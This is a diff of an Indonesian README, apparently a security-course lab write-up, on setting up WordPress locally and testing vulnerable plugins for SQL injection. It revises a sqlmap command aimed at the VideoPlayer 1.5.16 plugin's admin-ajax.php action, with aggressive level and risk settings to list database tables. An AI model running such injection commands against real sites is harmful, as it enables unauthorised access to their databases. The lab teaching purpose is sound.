@@ -57,7 +57,7 @@ define('WP_SITEURL', 'http://alamatip/nama_folder');
 - Simpan dan ubah nama menjadi **'wp-config.php'**.
 - Pada browser buka url yang telah di inputkan sebelumnya pada **'wp-config.php'**, seperti: <pre>
 http://192.168.100.19/wordpress/ -> (http://alamatip/nama_folder)
-</pre> dike
+</pre>
 
 - Pilih bahasa instalasi:
 
@@ -178,11 +178,11 @@ python sqlmap.py --url "http://alamat_site?league_id=1&season=Winter" --level 5 
 #### Plugin - VideoPlayer 1.5.16
 
 - Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
-python sqlmap.py --url "http://alamat_site?/wp-admin/admin-ajax.php" --data="action=spAjaxResults&pollid=1" --level 5 --risk 3 --dbms=mysql --tables
+python sqlmap.py --url "http://alamat_site?/wp-admin/admin-ajax.php?action=spiderVeideoPlayerselectplaylist" --level 5 --risk 3 --dbms=mysql --tables
 </pre>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
 
-![videoplayer 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/videoplayer1.png)
+![videoplayer 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables10.png)
 ![videoplayer 2](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/videoplayer2.png)
 
 ## Kesimpulan dan Saran
